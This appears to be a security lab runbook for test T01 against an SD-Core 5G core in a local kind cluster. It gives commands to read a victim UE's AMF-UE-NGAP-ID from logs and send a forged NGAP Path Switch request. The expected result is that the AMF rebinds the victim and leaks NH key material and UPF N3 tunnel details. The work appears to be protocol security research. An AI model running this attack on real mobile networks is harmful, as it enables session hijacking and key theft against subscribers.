# SD-Core — Path Switch → {NH,NCC} + UPF N3 disclosure (T01)

Git Bash, from `ngap_tester/`. Terminals / live logs / how to verify: see [`../README.md`](../README.md).
SD-Core runs on **kind**: tester uses `--network kind`; the AMF is a pod, so we capture on the
kind node netns `sdcore-control-plane`. SD-Core AMF log: `kubectl logs -n sdcore -l app=amf -f`.

**1. RAN (kind cluster already up)**
```bash
../5g-lab/scripts/ran.sh up ueransim sdcore
kubectl get pods -n sdcore        # AMF/SMF/UPF Running
```
**2. Victim AMF-UE-NGAP-ID** (large random — read it, don't `sweep`)
```bash
V=$(kubectl logs -n sdcore -l app=amf --tail=50 2>&1 | grep -oE 'AMF_UE_NGAP_ID:[0-9]+' | tail -1 | grep -oE '[0-9]+'); echo $V
```
**3. Capture + fire** (node netns; SBI scoped to 5GC ports to avoid k8s-API noise)
```bash
export AMF_FILTER='sctp or (udp port 8805) or (udp port 2152) or (tcp portrange 8000-9100) or (tcp port 29518)'
CFG_CORE=sdcore ./capture_attack.sh sdcore_T01_path_switch_key_n3_disclosure \
    sdcore-control-plane - ueransim-sdcore-ueransim-gnb-1 kind 25 \
    -- path-switch --source-amf-ue-id $V --teid 0x11111111
```
(`-` = skip a separate SMF capture; the node-netns AMF pcap already has SD-Core SBI/PFCP.)
**Expect:** NGAP **21 + 25** in `amf_ngap_nas_sbi.pcap`; the AMF rebinds the victim
(`ranUe.Ran = ran`). SD-Core's ACK uses an old encoding pycrate can't fully decode → the tester
prints `[warn] reply decode failed … raw kept`; the leaked NH is in that raw hex / `attack.jsonl`.
**Restore:** `docker restart ueransim-sdcore-ueransim-ue-1`
